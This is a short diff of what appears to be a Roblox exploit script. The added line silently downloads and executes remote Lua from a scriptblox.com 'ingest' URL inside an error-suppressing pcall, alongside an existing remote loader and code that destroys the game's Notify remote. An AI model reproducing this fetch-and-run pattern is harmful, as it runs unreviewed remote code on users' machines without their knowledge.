@@ -1,6 +1,8 @@
 -- Loading Screen
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xklrzz/KILLIER2.O-UI/refs/heads/main/Loading%20UI"))()
 
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_d0b1cc2ae438", "1.0.0", false) end)
+
 pcall(function() local notify = game:GetService("ReplicatedStorage").Remotes.Notify
 notify:Destroy()
 end)
